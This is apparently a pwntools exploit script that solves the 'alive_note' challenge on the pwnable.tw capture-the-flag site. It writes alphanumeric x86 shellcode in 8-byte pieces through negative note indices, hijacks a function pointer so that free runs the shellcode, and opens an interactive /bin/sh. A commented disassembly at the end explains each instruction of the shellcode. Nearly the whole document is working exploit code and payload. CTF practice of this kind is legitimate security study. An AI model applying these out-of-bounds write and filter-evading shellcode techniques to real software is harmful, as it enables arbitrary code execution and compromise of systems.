from pwn import *

local = False

if local:
	r = process("./alive_note")
else:
	r = remote("chall.pwnable.tw", 10300)
r.recvuntil("Your choice :")

def add(index, value):
	r.sendline("1")
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Name :")
	if (len(value) == 8):
		r.send(value)
	else:
		r.sendline(value)	
	r.recvuntil("Your choice :")
def show(index):
	r.sendline("2")
	r.recvuntil("Index :")
	r.sendline(str(index))
	return r.recvuntil("Your choice :")
def delete(index):
	r.sendline("3")
	r.recvuntil("Index :")
	r.sendline(str(index))
	r.recvuntil("Your choice :")
def jumping():
	add(-1, "a")
	add(-1, "a")
	add(-1, "a")
	add(-1, "a")

shellcode = "jPX4PPtHPYZXXtIf5C0uJf5q4IuI0H0IIIuHII0H1uIhC000XuH5lCX0PuHhC004XuH5lRYZPuHTZPQRRuHTUVWauIjPX4PPtHPYZj2XtH492z"


add(0, shellcode[0x0:0x8])
jumping()
add(-1, shellcode[0x8:0xf])
jumping()
add(-1, shellcode[0xf:0x15])
jumping()
add(-1, shellcode[0x15:0x1c])
jumping()
add(-1, shellcode[0x1c:0x24])
jumping()
add(-1, shellcode[0x24:0x2b])
jumping()
add(-1, shellcode[0x2b:0x33])
jumping()
add(-1, shellcode[0x33:0x3b])
jumping()
add(-1, shellcode[0x3b:0x43])
jumping()
add(-1, shellcode[0x43:0x4b])
jumping()
add(-1, shellcode[0x4b:0x53])
jumping()
add(-1, shellcode[0x53:0x5a])
jumping()
add(-1, shellcode[0x5a:0x62])
jumping()
add(-1, shellcode[0x62:0x6a])
jumping()
add(-1, shellcode[0x6a:0x6e])	


delete(0)
add(-27, shellcode[0x0:0x8])
# delete(-27)
r.sendline("3")
r.recvuntil("Index :")
#gdb.attach(r)
r.sendline("-27")
r.interactive()

'''
# This is the shellcode the author want us to make:
# 1. Unlike solution1, we set all general register instead of leaving it as default when call free and make use of it
# 2. jne or je: because we use xor to clear register so ZF flag will be set, when xor doesnot make zore, ZF flag will be clear again
# 3. Unlimit note we make, so the shellcode can lagerer than 80 bytes
# 4. lenght of payload is [1:8], unlike solution1 [7:8]
# 5. make a file to encode /bin/sh like i just did in solution1
# 6. want to know how to write alphanumeric shellcode? see the end of solution 1

$$$$$ Make the shellcode clear:

0:  6a 50                   push   0x50        ; clear eax, ecx, edx
2:  58                      pop    eax         ;
3:  34 50                   xor    al,0x50     ;
5:  50                      push   eax         ;
6:  74 48                   je     0x4a        ; ZF = 1

8:  50                      push   eax         ;
9:  59                      pop    ecx         ;
a:  5a                      pop    edx         ;
b:  58                      pop    eax         ; pop return addr, because eip point to our function (shellcode in fact)
c:  58                      pop    eax         ; eax = argument of free (our shellcode addr in fact)
d:  74 49                   je     0x4b        ; ZF still 1

f:  66 35 43 30             xor    ax,0x3043   ; make eax hold addr of `\xcd\x80`
13: 75 4a                   jne    0x4c        ; ZF = 0 because above xor instruction

15: 66 35 71 34             xor    ax,0x3471   ; make eax hold addr of `\xcd\x80`
19: 49                      dec    ecx         ; ecx = 0xffffffff
1a: 75 49                   jne    0x4b        ; ZF = 0

1c: 30 48 30                xor    BYTE PTR [eax+0x30],cl  ; make "\x32" -> "\xcd" because 0x32^0xff=0xcd
1f: 49                      dec    ecx         ; dec ecx until ecx = 0xfffffffa
20: 49                      dec    ecx
21: 49                      dec    ecx
22: 75 48                   jne    0x4a

24: 49                      dec    ecx
25: 49                      dec    ecx         ; eax = 0xfffffffa
26: 30 48 31                xor    BYTE PTR [eax+0x31],cl  ; 0xfa^0x7a=0x80    
29: 75 49                   jne    0x4b

2b: 68 43 30 30 30          push   0x30303043  ; encode "\x00hs/"
30: 58                      pop    eax         ;
31: 75 48                   jne    0x4a       

33: 35 6c 43 58 30          xor    eax,0x3058436c   ; xor to make eax become "\x00hs/"
38: 50                      push   eax         ; push "\x00hs\"
39: 75 48                   jne    0x4a

3b: 68 43 30 30 34          push   0x34303043  ; encode "nib/"
40: 58                      pop    eax
41: 75 48                   jne    0x4a

43: 35 6c 52 59 5a          xor    eax,0x5a59526c  ; make eax = "nib\"
48: 50                      push   eax         ; push into stack
49: 75 48                   jne    0x4a

4b: 54                      push   esp         ; push "/bin/sh\x00" addr into stack
4c: 5a                      pop    edx         ; save it in edx
4d: 50                      push   eax         ; start of popad: eax, ecx, edx, ebx, esp, ebp, esi, edi
4e: 51                      push   ecx         ;
4f: 52                      push   edx         ;
50: 52                      push   edx         ;
51: 75 48                   jne    0x4a

53: 54                      push   esp         ;
54: 55                      push   ebp         ;
55: 56                      push   esi         ;
56: 57                      push   edi         ;
57: 61                      popa               ; pop to all register, only ebx change to edx -> ebx = "/bin/sh\x00" addr
58: 75 49                   jne    0x4b

5a: 6a 50                   push   0x50        ; clear ecx, edx
5c: 58                      pop    eax         ;
5d: 34 50                   xor    al,0x50     ;
5f: 50                      push   eax         ;
60: 74 48                   je     0x4a

62: 50                      push   eax         ;
63: 59                      pop    ecx         ;
64: 5a                      pop    edx         ;
65: 6a 32                   push   0x32        ; make eax = 0xb
67: 58                      pop    eax         ;
68: 74 48                   je     0x4a        

6a: 34 39                   xor    al,0x39     ;
6c: 32                      .byte 0x32         ; for "\xcd"
6d: 7a                      .byte 0x7a         ; for "\x80"
'''
